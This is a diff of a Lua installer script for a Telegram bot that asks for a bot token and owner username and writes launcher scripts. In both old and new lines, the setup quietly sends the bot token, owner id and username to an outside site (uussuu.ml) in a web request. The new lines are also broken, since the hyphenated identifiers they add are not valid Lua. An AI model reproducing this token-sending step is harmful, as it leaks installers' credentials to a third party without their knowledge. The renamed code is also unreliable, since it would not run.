@@ -3,20 +3,20 @@ https = require("ssl.https")
 http = require("socket.http")
 JSON = dofile("./File_Libs/JSON.lua")
 local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
-Server_korpica = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
-local AutoFiles_korpica = function() 
+Server_Source-Becca = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
+local AutoFiles_Source-Becca = function() 
 local Create_Info = function(Token,Sudo,UserName)  
-local korpica_Info_Sudo = io.open("sudo.lua", 'w')
-korpica_Info_Sudo:write([[
+local Source-Becca_Info_Sudo = io.open("sudo.lua", 'w')
+Source-Becca_Info_Sudo:write([[
 token = "]]..Token..[["
 
 Sudo = ]]..Sudo..[[  
 
 UserName = "]]..UserName..[["
 ]])
-korpica_Info_Sudo:close()
+Source-Becca_Info_Sudo:close()
 end  
-if not database:get(Server_korpica.."Token_korpica") then
+if not database:get(Server_Source-Becca.."Token_Source-Becca") then
 print("\27[1;34m»» Send Your Token Bot :\27[m")
 local token = io.read()
 if token ~= '' then
@@ -25,7 +25,7 @@ if res ~= 200 then
 io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
 else
 io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
-database:set(Server_korpica.."Token_korpica",token)
+database:set(Server_Source-Becca.."Token_Source-Becca",token)
 end 
 else
 io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
@@ -34,7 +34,7 @@ os.execute('lua start.lua')
 end
 ------------------------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------------------------
-if not database:get(Server_korpica.."UserName_korpica") then
+if not database:get(Server_Source-Becca.."UserName_Source-Becca") then
 print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
 local UserName = io.read():gsub('@','')
 if UserName ~= '' then
@@ -53,8 +53,8 @@ io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
 os.execute('lua start.lua')
 else
 io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
-database:set(Server_korpica.."UserName_korpica",Json.Info.Username)
-database:set(Server_korpica.."Id_korpica",Json.Info.Id)
+database:set(Server_Source-Becca.."UserName_Source-Becca",Json.Info.Username)
+database:set(Server_Source-Becca.."Id_Source-Becca",Json.Info.Id)
 end
 end
 else
@@ -62,47 +62,47 @@ io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
 end 
 os.execute('lua start.lua')
 end
-local function Files_korpica_Info()
-Create_Info(database:get(Server_korpica.."Token_korpica"),database:get(Server_korpica.."Id_korpica"),database:get(Server_korpica.."UserName_korpica"))   
-https.request("https://uussuu.ml/korpica/korpica.php?id="..database:get(Server_korpica.."Id_korpica").."&user="..database:get(Server_korpica.."UserName_korpica").."&token="..database:get(Server_korpica.."Token_korpica"))
-local Runkorpica = io.open("korpica", 'w')
-Runkorpica:write([[
+local function Files_Source-Becca_Info()
+Create_Info(database:get(Server_Source-Becca.."Token_Source-Becca"),database:get(Server_Source-Becca.."Id_Source-Becca"),database:get(Server_Source-Becca.."UserName_Source-Becca"))   
+https.request("https://uussuu.ml/Source-Becca/Source-Becca.php?id="..database:get(Server_Source-Becca.."Id_Source-Becca").."&user="..database:get(Server_Source-Becca.."UserName_Source-Becca").."&token="..database:get(Server_Source-Becca.."Token_Source-Becca"))
+local RunSource-Becca = io.open("Source-Becca", 'w')
+RunSource-Becca:write([[
 #!/usr/bin/env bash
-cd $HOME/korpica
-token="]]..database:get(Server_korpica.."Token_korpica")..[["
-rm -fr korpica.lua
-wget "https://raw.githubusercontent.com/korapica-Team/korpica/master/korpica.lua"
+cd $HOME/Source-Becca
+token="]]..database:get(Server_Source-Becca.."Token_Source-Becca")..[["
+rm -fr Source-Becca.lua
+wget "https://raw.githubusercontent.com/korapica-Team/Source-Becca/master/Source-Becca.lua"
 while(true) do
 rm -fr ../.telegram-cli
-./tg -s ./korpica.lua -p PROFILE --bot=$token
+./tg -s ./Source-Becca.lua -p PROFILE --bot=$token
 done
 ]])
-Runkorpica:close()
+RunSource-Becca:close()
 local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/korpica
+cd $HOME/Source-Becca
 while(true) do
 rm -fr ../.telegram-cli
-screen -S korpica -X kill
-screen -S korpica ./korpica
+screen -S Source-Becca -X kill
+screen -S Source-Becca ./Source-Becca
 done
 ]])
 RunTs:close()
 end
-Files_korpica_Info()
-database:del(Server_korpica.."Token_korpica");database:del(Server_korpica.."Id_korpica");database:del(Server_korpica.."UserName_korpica")
+Files_Source-Becca_Info()
+database:del(Server_Source-Becca.."Token_Source-Becca");database:del(Server_Source-Becca.."Id_Source-Becca");database:del(Server_Source-Becca.."UserName_Source-Becca")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 end 
 local function Load_File()  
 local f = io.open("./sudo.lua", "r")  
 if not f then   
-AutoFiles_korpica()  
+AutoFiles_Source-Becca()  
 var = true
 else   
 f:close()  
-database:del(Server_korpica.."Token_korpica");database:del(Server_korpica.."Id_korpica");database:del(Server_korpica.."UserName_korpica")
+database:del(Server_Source-Becca.."Token_Source-Becca");database:del(Server_Source-Becca.."Id_Source-Becca");database:del(Server_Source-Becca.."UserName_Source-Becca")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 var = false
